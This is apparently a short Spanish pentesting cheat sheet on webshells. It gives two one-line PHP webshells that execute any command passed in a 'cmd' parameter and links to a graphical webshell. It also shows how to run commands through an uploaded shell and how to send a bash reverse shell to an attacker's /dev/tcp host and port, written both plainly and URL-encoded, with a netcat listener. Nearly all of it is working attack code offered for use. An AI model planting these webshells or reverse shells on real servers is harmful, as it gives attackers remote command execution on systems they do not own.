# Webshells

Una webshell es un archivo que, subido al servidor, permite ejecutar comandos del sistema a traves del navegador.

## Webshell PHP Manual

Crear un archivo PHP con este contenido:

```php
<?php
   echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

```php
<?php
   system($_GET['cmd'])
?>
```

> Enlace a webshell con interfaz gráfica: [p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php)

## Ejecutar Comandos

Una vez subida, se ejecuta cualquier comando agregando `?cmd=` a la URL:

```
http://<IP>/uploads/webshell.php?cmd=id
```

## Reverse Shell via Webshell

Para enviar una reverse shell, codificamos el comando en URL.

Comando original:

```bash
bash -c "bash -i>&/dev/tcp/<IP_atacante>/<puerto> 0>&1"
```

Codificarlo como URL (se puede usar BurpSuite > Decoder > Encode as URL):

```
http://<IP>/uploads/webshell.php?cmd=bash%20-c%20%22bash%20-i%3E%26%2Fdev%2Ftcp%2F<IP_atacante>%2F4444%200%3E%261%22
```

> Previamente ponerse en escucha con `nc -lvnp <puerto>